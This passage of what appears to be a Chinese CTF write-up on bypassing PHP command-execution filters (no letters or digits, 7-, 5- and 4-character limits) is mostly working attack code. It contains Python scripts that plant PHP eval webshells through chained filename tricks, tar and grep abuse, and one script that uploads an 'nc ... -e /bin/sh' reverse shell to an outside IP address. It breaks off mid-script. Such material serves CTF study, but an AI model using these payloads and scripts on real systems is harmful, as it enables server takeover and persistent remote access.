class="hljs-string">&quot;/[a-z]|[0-9]/i&quot;</span>,<span class="hljs-variable">$cmd</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>构造一个文件上传网页，强制上传，利用<code>?</code>匹配文件来rce</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://15763fb4-39d9-4a94-886d-313843ffdc96.challenges.ctfer.com:8080/?cmd=.%20/???/????????[@-[]&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span>/&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>抓包爆破，用<code>[@-[]</code>来匹配大写字母，可以增加读到的概率</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs text">POST /?cmd=.%20/???/????????[@-[] HTTP/1.1<br>Host: 15763fb4-39d9-4a94-886d-313843ffdc96.challenges.ctfer.com:8080<br>Content-Length: 421<br>Cache-Control: max-age=0<br>Upgrade-Insecure-Requests: 1<br>Origin: http://192.168.1.17<br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIoD8zFE5URcUFT3b<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Referer: http://192.168.1.17/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8<br>Connection: close<br><br>------WebKitFormBoundaryIoD8zFE5URcUFT3b<br>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;<br>Content-Type: text/html<br><br><br>whoami<br>------WebKitFormBoundaryIoD8zFE5URcUFT3b--<br><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/wuzimushuzi1.png"></p><h3 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h3><h4 id="7字符长度的命令执行"><a href="#7字符长度的命令执行" class="headerlink" title="7字符长度的命令执行"></a>7字符长度的命令执行</h4><h5 id="web目录可写"><a href="#web目录可写" class="headerlink" title="web目录可写"></a>web目录可写</h5><p>可写的情况主要利用<code>&gt;</code>写入shell到文件名中，然后利用<code>ls -t</code>命令排序，写入文件后用<code>.</code>执行。具体思路如下</p><p>在<code>linux</code>中，可以利用<code>&gt;aa</code>创建一个文件，文件名就是<code>aa</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce7-1.png"></p><p>执行一次<code>ls -t&gt;0</code>，然后<code>cat 0</code>，会发现文件中按照创建文件的先后顺序进行了排序，那么如果将里面的内容替换成恶意的一句话木马，然后执行，不就能rce了吗</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce7-3.png"></p><p>为了避免符号的原因导致写入失败，先把一句话木马转成base64形式<br><code>&lt;?php eval($_GET[1]);</code></p><p><code>PD9waHAgZXZhbCgkX0dFVFsxXSk7</code></p><p><code>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</code></p><p>然后对要执行的命令进行分割，不超过7个一组，注意每组后面加个<code>\</code>，在linux中表示一行未输入完</p><p>最后<code>0</code>文件中应该是如下内容</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce7-2.png"></p><p>执行<code>. 0</code>，就会生成一个<code>1.php</code></p><p>整合脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:01</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://75026f50-dfd3-4928-9a7c-c1d59c860cb3.challenge.ctf.show/&quot;</span><br><br>payload=[<br><span class="hljs-string">&quot;&gt;hp&quot;</span>,<br><span class="hljs-string">&quot;&gt;1.p\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;d\\&gt;\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;\\ -\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;e64\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;bas\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;7\\|\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;XSk\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;Fsx\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;dFV\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;kX0\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;bCg\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;XZh\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;AgZ\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;waH\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;PD9\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;o\\ \\&quot;</span>,<br><span class="hljs-string">&quot;&gt;ech\\&quot;</span>,<br><span class="hljs-string">&quot;ls -t&gt;0&quot;</span>,<br><span class="hljs-string">&quot;. 0&quot;</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>data=&#123;<br><span class="hljs-string">&quot;cmd&quot;</span>:payload<br>&#125;<br>requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>writeFile(p.strip())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>response = requests.get(url+<span class="hljs-string">&quot;1.php&quot;</span>)<br><span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;.1.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>run()<br>check()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><h5 id="web目录不可写"><a href="#web目录不可写" class="headerlink" title="web目录不可写"></a>web目录不可写</h5><p>既然当前目录不可写，那么可以利用可写的目录，比如php的临时文件存储目录<code>/tmp/</code></p><p>这样我们可以利用php的文件存储机制强行上传一个文件，内容是反弹shell的语句，然后利用<code>. /t*/*</code>匹配我们上传的文件并执行，刚好7个字符</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce7-4.png"></p><p>自动化脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:10</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://f1f8f51f-8da6-43cc-ab09-d5456cc2bcb7.challenge.ctf.show/&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getShell</span>(<span class="hljs-params">payload</span>):<br>data=&#123;<br><span class="hljs-string">&quot;cmd&quot;</span>:payload<br>&#125;<br>file = &#123;<br><span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">b&quot;#!/bin/sh\nnc 43.154.107.226 3389 -e /bin/sh&quot;</span><br>&#125;<br>requests.post(url,data=data,files=file)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>getShell(<span class="hljs-string">&quot;. /t*/*&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>run()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><h4 id="5字符长度的命令执行"><a href="#5字符长度的命令执行" class="headerlink" title="5字符长度的命令执行"></a>5字符长度的命令执行</h4><h5 id="环境有dir"><a href="#环境有dir" class="headerlink" title="环境有dir"></a>环境有dir</h5><p>主要思路：<br>1：将<code>index.php</code>转为<code>.php</code><br>2：将临时文件打包到当前目录<br>3：使用php执行tar压缩包</p><p>第一步的操作与7字符可写差不多，主要是为了<code>index.php</code>这个文件名不影响后面的排序</p><p>先复制一份<code>index.php</code>的内容</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-1.png"></p><p>然后通过<code>cp</code>，<code>rev</code>，<code>dir</code>等命令将<code>index.php</code>转化为了<code>php.xedni</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-2.png"></p><p>先将多余的文件删除，再利用shell中的注释符<code>#</code>，成功得到<code>.php</code>文件</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-3.png"></p><p>删去多余的文件，创建<code>tar</code>命令和<code>vcf</code>参数</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-4.png"></p><p>强制上传一个文件到php的文件缓存目录<code>/tmp/xxxx</code>，内容是<code>&lt;?php file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;);?&gt;</code></p><p>然后最关键的命令来了，使用<code>* /t*</code>打包恶意文件到<code>z</code>，实际上执行的是<code>tar vcf z /tmp/*</code></p><p>最后使用<code>php z</code>命令写入shell</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-5.png"></p><p>自动化脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:17</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://78c1f836-ab24-4a5b-a22f-ce1494fe1b4c.challenge.ctf.show/&quot;</span><br>url_2 = url+<span class="hljs-string">&quot;.php&quot;</span><br>delay = <span class="hljs-number">1</span><br><br>chagneFile_payload=[<br><span class="hljs-string">&#x27;&gt;cp&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;k&#x27;</span>,<br><span class="hljs-string">&#x27;*&#x27;</span>,<br><span class="hljs-string">&#x27;rm cp&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;pc&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;dir&#x27;</span>,<br><span class="hljs-string">&#x27;*&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;rev&#x27;</span>,<br><span class="hljs-string">&#x27;*v&gt;z&#x27;</span>,<br><span class="hljs-string">&#x27;sh z&#x27;</span>,<br><span class="hljs-string">&#x27;rm v&#x27;</span>,<br><span class="hljs-string">&#x27;rm k&#x27;</span>,<br><span class="hljs-string">&#x27;rm z&#x27;</span>,<br><span class="hljs-string">&#x27;rm pc&#x27;</span>,<br><span class="hljs-string">&#x27;rm *v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;php.&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;j\\#&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;vm&#x27;</span>,<br><span class="hljs-string">&#x27;*&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;rev&#x27;</span>,<br><span class="hljs-string">&#x27;*v&gt;z&#x27;</span>,<br><span class="hljs-string">&#x27;sh z&#x27;</span><br>]<br><br>clearFile_payload=[<br><span class="hljs-string">&#x27;rm d*&#x27;</span>,<br><span class="hljs-string">&#x27;rm j*&#x27;</span>,<br><span class="hljs-string">&#x27;rm p*&#x27;</span>,<br><span class="hljs-string">&#x27;rm r*&#x27;</span>,<br><span class="hljs-string">&#x27;rm v*&#x27;</span>,<br><span class="hljs-string">&#x27;rm z&#x27;</span><br>]<br><br>shell_payload=[<br><span class="hljs-string">&#x27;&gt;tar&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;vcf&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;z&#x27;</span><br>]<br><br>file=&#123;<br><span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-string">b&#x27;&lt;?php file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot;);?&gt;&#x27;</span><br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">changeFile</span>():<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> chagneFile_payload:<br>sendPayload(url,p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>time.sleep(delay)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clearFile</span>():<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> clearFile_payload:<br>sendPayload(url_2,p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>time.sleep(delay)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getshell</span>():<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> shell_payload:<br>sendPayload(url_2,p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>time.sleep(delay)<br>data=&#123;<br><span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;* /t*&quot;</span><br>&#125;<br>requests.post(url_2,data=data,files=file)<br>data=&#123;<br><span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;php z&quot;</span><br>&#125;<br>requests.post(url_2,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkShell</span>():<br>response = requests.get(url+<span class="hljs-string">&quot;1.php&quot;</span>)<br><span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;1.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sendPayload</span>(<span class="hljs-params">url,payload</span>):<br>data=&#123;<br><span class="hljs-string">&quot;cmd&quot;</span>:payload<br>&#125;<br>requests.post(url,data=data)<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>changeFile()<br>clearFile()<br>getshell()<br>checkShell()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>run()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><h5 id="环境无dir"><a href="#环境无dir" class="headerlink" title="环境无dir"></a>环境无dir</h5><p><code>dir</code>与<code>ls</code>最大的区别就是<code>dir</code>没有换行</p><p>这题主要思路是利用<code>grep</code>命令修改题目，可以说是非常巧妙了</p><p>具体步骤如下:</p><p>写入<code>grep</code>和<code>h</code>，接着<code>*</code>执行，实际上就是拿出题目中包含<code>h</code>的每一行，恰好<code>if(strlen($cmd) &lt;= 5)</code>是没有<code>h</code>的，这样就没有限制了</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-6.png"></p><p>将修改后的代码追加到<code>i</code>中</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-7.png"></p><p><code>cp</code>到<code>index.php</code>中</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-8.png"></p><p>整合脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:28</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://39fede4b-390d-42a1-b6c4-0924a2556b4e.challenge.ctf.show/&quot;</span><br><br>payload=[<br><span class="hljs-string">&quot;&gt;grep&quot;</span>,<br><span class="hljs-string">&quot;&gt;h&quot;</span>,<br><span class="hljs-string">&quot;*&gt;j&quot;</span>,<br><span class="hljs-string">&quot;rm g*&quot;</span>,<br><span class="hljs-string">&quot;rm h*&quot;</span>,<br><span class="hljs-string">&quot;&gt;cat&quot;</span>,<br><span class="hljs-string">&quot;*&gt;&gt;i&quot;</span>,<br><span class="hljs-string">&quot;rm c*&quot;</span>,<br><span class="hljs-string">&quot;rm j&quot;</span>,<br><span class="hljs-string">&quot;&gt;cp&quot;</span>,<br><span class="hljs-string">&quot;*&quot;</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>data=&#123;<br><span class="hljs-string">&quot;cmd&quot;</span>:payload<br>&#125;<br>requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>writeFile(p.strip())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>time.sleep(<span class="hljs-number">0.3</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>run()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><h4 id="4字符长度的命令执行"><a href="#4字符长度的命令执行" class="headerlink" title="4字符长度的命令执行"></a>4字符长度的命令执行</h4><h5 id="环境有dir-1"><a href="#环境有dir-1" class="headerlink" title="环境有dir"></a>环境有dir</h5><p>主要思路和7字符可写差不多，拼接出<code>ls -t</code>命令到某个文件中，在按倒序写入写马的语句，依次执行即可。主要是注意文件顺序问题</p><p>自动化脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:42</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://eb893c73-86c3-449f-98fe-0f82d9212110.challenge.ctf.show/&quot;</span><br><br>payload = [<br><span class="hljs-string">&#x27;&gt;sl&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;kt-&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;j\\&gt;&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;j\\#&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;dir&#x27;</span>,<br><span class="hljs-string">&#x27;*&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;rev&#x27;</span>,<br><span class="hljs-string">&#x27;*v&gt;x&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;php&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;a.\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\&gt;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;-d\\&#x27;</span>,<br><span 